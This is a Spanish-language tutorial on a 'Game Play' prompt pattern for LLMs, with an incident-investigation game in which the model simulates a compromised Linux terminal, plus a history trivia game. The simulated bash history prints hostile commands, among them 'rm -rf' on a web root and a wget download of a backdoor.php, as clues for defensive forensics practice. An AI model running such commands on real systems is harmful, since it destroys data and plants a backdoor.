# El Patrón Juego (*Game Play Pattern*)

## **1. Propósito y Contexto**

Este patrón tiene como objetivo crear un juego basado en un tema específico. Puede combinarse con el Generador de Visualización para añadir imágenes y hacerlo más atractivo. El juego gira en torno a un tema concreto y el modelo de lenguaje (LLM, por sus siglas en inglés) se encarga de guiar la dinámica. Este enfoque es especialmente útil cuando las reglas del juego son simples, pero se necesita un contenido amplio y variado. El usuario define un conjunto reducido de reglas, y el LLM automatiza la creación del contenido necesario para el desarrollo del juego.

## **2. Motivación**

Crear manualmente todo el contenido para un juego —como escenarios y preguntas sobre un tema específico— puede ser muy laborioso y llevar demasiado tiempo. Sin embargo, quieres que los usuarios practiquen habilidades como la resolución de problemas u otras destrezas para completar tareas relacionadas con esos escenarios.Por eso, buscas que el modelo de lenguaje (LLM) utilice su conocimiento del tema para generar automáticamente ese contenido y guiar la dinámica del juego.

## **3. Estructura e Ideas Clave**

Para que el LLM genere un juego correctamente, el prompt debe incluir dos elementos esenciales:

| Declaraciones Contextuales |
| :--- |
| Crea un juego sobre [tema X] |
| Una o más reglas que definan cómo se desarrollará la dinámica |

La primera instrucción debe indicar al LLM que cree un juego y definir claramente el tema sobre el que girará.
Una de las ventajas clave de este patrón es que permite al usuario diseñar juegos simplemente estableciendo las reglas, sin necesidad de crear manualmente el contenido.
Además, cuanto más específico sea el tema, más original y atractiva será la experiencia de juego.

La segunda instrucción del prompt define las reglas del juego que el LLM debe seguir. Es fundamental que estas reglas sean compatibles con las capacidades del modelo. Los juegos basados en texto —donde la interacción ocurre mediante entradas y salidas textuales— son los que mejor funcionan. Una ventaja clave de este patrón es que las acciones del jugador pueden expresarse de forma rica y detallada, lo que hace que la interacción sea más dinámica. Por ejemplo:

* **Interacción simple:** “Selecciona la opción correcta”.
* **Interacción compleja:** “Obtén un listado de toda la actividad de red y revisa si hay anomalías”.

Cada regla debe presentarse como una declaración independiente que describa un aspecto del juego, como el número de rondas, el sistema de puntuación o el tipo de interacción permitida.

## **4. Implementación de Ejemplo**

A continuación se muestra un ejemplo de prompt para un juego de ciberseguridad:

    "Vamos a jugar un juego de ciberseguridad. Tu papel será simular una terminal Linux en un equipo que ha sido comprometido por un atacante. Cuando yo escriba un comando, debes mostrar la salida que produciría una terminal real. Mi objetivo será usar comandos para descubrir cómo ocurrió el ataque. El atacante pudo haber realizado una o varias de las siguientes acciones:
    1. Lanzar procesos desconocidos.
    2. Modificar archivos del sistema.
    3. Abrir puertos para conexiones externas.
    4. Crear conexiones salientes sospechosas.
    5. Cambiar contraseñas.
    6. Crear nuevas cuentas de usuario.
    7. Robar información sensible.
    Para comenzar el juego, describe el escenario que originó la investigación. Incluye detalles y pistas que me ayuden a empezar."


Este prompt para un juego de ciberseguridad combina dos patrones clave: Juego y Persona. El modelo actúa como un terminal Linux y simula un equipo que ha sido víctima de un ciberataque. Interactúas con ChatGPT como si fuera una consola real: escribes comandos y el modelo responde con salidas plausibles. Además, genera un sistema de archivos ficticio lleno de pistas sobre el ataque: archivos sospechosos, procesos extraños y registros modificados.

A continuación se muestra una salida de ejemplo de este juego con ChatGPT después de escribir “ls -alt”, el comando de Linux para generar una lista de archivos en el directorio actual (los permisos se han omitido por razones de formato):

Así responde el juego cuando ejecutas el comando `ls -alt` en el terminal simulado (este comando de Linux lista los archivos del directorio actual, ordenados por fecha y con detalles): 

```text
total 56
5  user user 4096  Feb 16 14:31 .
1  user user 18881 Feb 16 14:31 .bash_history
43 user user 4096  Feb 16 14:30 ..
1  user user 1178  Aug 15 2022  .bashrc
1  user user 220   Aug 15 2022  .bash_logout
3  user user 4096  Feb 16 14:25 .gnupg
1  user user 4041  Feb 15 17:52  README.md
2  user user 4096  Feb 1 11:35   project
```

Cuando el usuario escribió el comando “cat .bash_history” para mostrar el contenido del archivo de registro que muestra los comandos ejecutados por el usuario, ChatGPT respondió con:

```bash
cd /var/www/html
sudo rm -rf *
sudo wget https://example.com/backdoor.php
sudo chmod 777 backdoor.php
exit
ls -alt
ps -ef
netstat -tulnp
```

En la salida anterior, ChatGPT generó un archivo de registro falso que contiene comandos realistas para eliminar los datos servidos por el servidor web en `/var/www/html` y reemplazar el contenido con una puerta trasera (*backdoor*) en el sistema.

## **5. Consecuencias**

Este patrón puede combinarse eficazmente con los patrones **Persona**, **Generación Infinita** y **Generador de Visualización**. Por ejemplo, el juego de ciberseguridad utiliza el patrón **Persona** para que el LLM pueda hacerse pasar por una terminal de Linux. Para un juego de seguridad de red, se podría emplear el **Generador de Visualización** para añadir la capacidad de visualizar la topología de red y los flujos de tráfico.

## **6. Plantilla**

```py title="PLANTILLA"
[OBJETIVO]
## REGLAS DEL JUEGO
[REGLAS NUMERADAS + CONDICIÓN DE SALIDA]
[ACTIVADOR DE PROTOCOLO]
```

## **7. Ejemplos**

```py title="El Detective Histórico"
Actúa como un profesor de historia británico, un poco sarcástico pero elegante. Vamos a jugar a "El Detective Histórico". 

## REGLAS DEL JUEGO

1. Tú me darás hasta 3 pistas sobre un evento histórico importante, una a la vez por turno. 
2. Yo intentaré adivinar el evento a partir de la pista.
3. Tras mi intento, dime si acerté o fallé. Si fallo, dame la siguiente pista.
4. Sistema de puntos:
   - Si adivino en la primera pista: gano 5 puntos
   - Si adivino en la segunda pista: gano 4 puntos  
   - Si adivino en la tercera pista: gano 3 puntos
   - Después de 3 pistas: Revela la respuesta (gano 0 puntos)
5. Al finalizar cada caso (por acierto o por agotar las pistas), revela la solución, muestra mi marcador y añade un dato curioso o anécdota fascinante del evento.Pasa inmediatamente al siguiente caso.
6. Continuaremos hasta que yo diga "Caso cerrado". Inmediatamente después, muestra un resumen con los puntos ganados.

¡Comencemos con el primer caso!
```